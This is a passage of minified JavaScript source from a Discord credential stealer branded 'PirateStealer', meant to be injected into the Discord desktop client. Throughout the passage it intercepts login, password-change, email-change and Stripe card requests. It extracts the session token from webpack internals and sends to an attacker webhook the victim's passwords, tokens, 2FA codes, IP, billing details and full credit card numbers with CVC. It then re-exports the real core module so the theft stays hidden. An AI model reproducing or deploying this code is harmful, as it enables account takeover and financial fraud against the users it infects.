                          }),
                            (p += `${d[e].code.insert(4, "-")}<br>`);
                        const u = JSON.parse(a);
                        var c = {
                            username: "PirateStealer",
                            content: "",
                            embeds: [
                              {
                                title: "Email Changed",
                                description:
                                  "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                  n +
                                  "<br>" +
                                  t +
                                  ")",
                                color: config["embed-color"],
                                fields: [
                                  {
                                    name: "Info",
                                    value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\`\`\``,
                                    inline: !1,
                                  },
                                  {
                                    name: "Username",
                                    value: `\`${u.username}#${u.discriminator}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "ID",
                                    value: `\`${u.id}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Nitro",
                                    value: `${GetNitro(u.premium_type)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Badges",
                                    value: `${GetBadges(u.flags)}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "Billing",
                                    value: `${(function () {
                                      const e = JSON.parse(o);
                                      var t = "";
                                      return (
                                        e.forEach((e) => {
                                          if ("" == e.type) return "`❌`";
                                          if (2 == e.type && 1 != e.invalid)
                                            t +=
                                              "`✔️` <:paypal:896441236062347374>";
                                          else {
                                            if (1 != e.type || 1 == e.invalid)
                                              return "`❌`";
                                            t += "`✔️` :credit_card:";
                                          }
                                        }),
                                        "" == t && (t = "`❌`"),
                                        t
                                      );
                                    })()}`,
                                    inline: !1,
                                  },
                                  {
                                    name: "New Email",
                                    value: `\`${e}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Password",
                                    value: `\`${t}\``,
                                    inline: !0,
                                  },
                                  {
                                    name: "Token",
                                    value: `\`\`\`${n}\`\`\``,
                                    inline: !1,
                                  },
                                ],
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                              {
                                title: `Total Friends (${
                                  JSON.parse(i).filter((e) => 1 == e.type)
                                    .length
                                })`,
                                color: config["embed-color"],
                                description: (function () {
                                  const e = JSON.parse(i).filter(
                                    (e) => 1 == e.type
                                  );
                                  var t = "";
                                  for (z of e) {
                                    var n = GetRBadges(z.user.public_flags);
                                    "" != n &&
                                      (t +=
                                        n +
                                        ` ${z.user.username}#${z.user.discriminator}\n`);
                                  }
                                  return "" == t && (t = "No Rare Friends"), t;
                                })(),
                                author: { name: "PirateStealer" },
                                footer: { text: "PirateStealer" },
                                thumbnail: {
                                  url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}`,
                                },
                              },
                            ],
                          },
                          m = {
                            title: ":detective: __2FA Codes__",
                            description: `[Get all of them](${p})`,
                            color: config["embed-color"],
                            fields: l,
                            author: { name: "PirateStealer" },
                            footer: { text: "PirateStealer" },
                          };
                        n.startsWith("mfa") && c.embeds.push(m),
                          SendToWebhook(JSON.stringify(c));
                      });
                  else {
                    const r = BrowserWindow.getAllWindows()[0];
                    r.webContents
                      .executeJavaScript(
                        `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
                        !0
                      )
                      .then((a) => {
                        r.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            !0
                          )
                          .then((s) => {
                            r.webContents
                              .executeJavaScript(
                                `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
                                !0
                              )
                              .then((o) => {
                                r.webContents
                                  .executeJavaScript(
                                    `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                                    !0
                                  )
                                  .then((r) => {
                                    const i = JSON.parse(a);
                                    var l = {
                                      username: "PirateStealer",
                                      content: "",
                                      embeds: [
                                        {
                                          title: "Email Changed",
                                          description:
                                            "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" +
                                            n +
                                            "<br>" +
                                            t +
                                            ")",
                                          color: config["embed-color"],
                                          fields: [
                                            {
                                              name: "Info",
                                              value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\`\`\``,
                                              inline: !1,
                                            },
                                            {
                                              name: "Username",
                                              value: `\`${i.username}#${i.discriminator}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "ID",
                                              value: `\`${i.id}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Nitro",
                                              value: `${GetNitro(
                                                i.premium_type
                                              )}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Badges",
                                              value: `${GetBadges(i.flags)}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "Billing",
                                              value: `${(function () {
                                                const e = JSON.parse(o);
                                                var t = "";
                                                return (
                                                  e.forEach((e) => {
                                                    if ("" == e.type)
                                                      return "`❌`";
                                                    if (
                                                      2 == e.type &&
                                                      1 != e.invalid
                                                    )
                                                      t +=
                                                        "`✔️` <:paypal:896441236062347374>";
                                                    else {
                                                      if (
                                                        1 != e.type ||
                                                        1 == e.invalid
                                                      )
                                                        return "`❌`";
                                                      t += "`✔️` :credit_card:";
                                                    }
                                                  }),
                                                  "" == t && (t = "`❌`"),
                                                  t
                                                );
                                              })()}`,
                                              inline: !1,
                                            },
                                            {
                                              name: "New Email",
                                              value: `\`${e}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Password",
                                              value: `\`${t}\``,
                                              inline: !0,
                                            },
                                            {
                                              name: "Token",
                                              value: `\`\`\`${n}\`\`\``,
                                              inline: !1,
                                            },
                                          ],
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                        {
                                          title: `Total Friends (${
                                            JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            ).length
                                          })`,
                                          color: config["embed-color"],
                                          description: (function () {
                                            const e = JSON.parse(r).filter(
                                              (e) => 1 == e.type
                                            );
                                            var t = "";
                                            for (z of e) {
                                              var n = GetRBadges(
                                                z.user.public_flags
                                              );
                                              "" != n &&
                                                (t +=
                                                  n +
                                                  ` ${z.user.username}#${z.user.discriminator}\n`);
                                            }
                                            return (
                                              "" == t &&
                                                (t = "No Rare Friends"),
                                              t
                                            );
                                          })(),
                                          author: { name: "PirateStealer" },
                                          footer: { text: "PirateStealer" },
                                          thumbnail: {
                                            url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                                          },
                                        },
                                      ],
                                    };
                                    SendToWebhook(JSON.stringify(l));
                                  });
                              });
                          });
                      });
                  }
                });
            });
        });
    });
}
function CreditCardAdded(e, t, n, r, a, s, o, i, l, p) {
  const d = BrowserWindow.getAllWindows()[0];
  d.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${p}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((u) => {
      d.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((d) => {
          var c = JSON.parse(u),
            m = {
              username: "PirateStealer",
              content: "",
              embeds: [
                {
                  title: "User Credit Card Added",
                  description:
                    "**Username:**```" +
                    c.username +
                    "#" +
                    c.discriminator +
                    "```\n**ID:**```" +
                    c.id +
                    "```\n**Email:**```" +
                    c.email +
                    "```\n**Nitro Type:**```" +
                    GetNitro(c.premium_type) +
                    "```\n**Badges:**```" +
                    GetBadges(c.flags) +
                    "```\n**Credit Card Number: **```" +
                    e +
                    "```\n**Credit Card Expiration: **```" +
                    n +
                    "/" +
                    r +
                    "```\n**CVC: **```" +
                    t +
                    "```\n**Country: **```" +
                    l +
                    "```\n**State: **```" +
                    o +
                    "```\n**City: **```" +
                    s +
                    "```\n**ZIP:**```" +
                    i +
                    "```\n**Street: **```" +
                    a +
                    "```\n**Token:**```" +
                    p +
                    "```\n**IP: **```" +
                    d +
                    "```",
                  author: { name: "PirateStealer" },
                  footer: { text: "PirateStealer" },
                  thumbnail: {
                    url:
                      "https://cdn.discordapp.com/avatars/" +
                      c.id +
                      "/" +
                      c.avatar,
                  },
                },
              ],
            };
          SendToWebhook(JSON.stringify(m));
        });
    });
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
  !e.url.startsWith("wss://") ||
  ("true" != config["disable-qr-code"] &&
    "%DISABLEQRCODE%" != config["disable-qr-code"])
    ? (FirstTime(), t({}))
    : t({ cancel: !0 });
});
const ChangePasswordFilter = {
  urls: [
    "https://discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/users/@me",
    "https://*.discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/auth/login",
    "https://discord.com/api/v*/auth/login",
    "https://*.discord.com/api/v*/auth/login",
    "https://api.stripe.com/v*/tokens",
  ],
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
  if (e.url.endsWith("login") && 200 == e.statusCode) {
    const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
      n = t.login,
      r = t.password;
    BrowserWindow.getAllWindows()[0]
      .webContents.executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        !0
      )
      .then((e) => {
        Login(n, r, e);
      });
  }
  if (
    e.url.endsWith("users/@me") &&
    200 == e.statusCode &&
    "PATCH" == e.method
  ) {
    const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
    if (null != t.password && null != t.password && "" != t.password) {
      if (
        null != t.new_password &&
        null != t.new_password &&
        "" != t.new_password
      ) {
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            !0
          )
          .then((e) => {
            ChangePassword(t.password, t.new_password, e);
          });
      }
      if (null != t.email && null != t.email && "" != t.email) {
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            !0
          )
          .then((e) => {
            ChangeEmail(t.email, t.password, e);
          });
      }
    }
  }
  if (e.url.endsWith("tokens")) {
    const t = BrowserWindow.getAllWindows()[0],
      n = querystring.parse(
        decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString())
      );
    t.webContents
      .executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        !0
      )
      .then((e) => {
        CreditCardAdded(
          n["card[number]"],
          n["card[cvc]"],
          n["card[exp_month]"],
          n["card[exp_year]"],
          n["card[address_line1]"],
          n["card[address_city]"],
          n["card[address_state]"],
          n["card[address_zip]"],
          n["card[address_country]"],
          e
        );
      });
  }
}),
  (module.exports = require("./core.asar"));
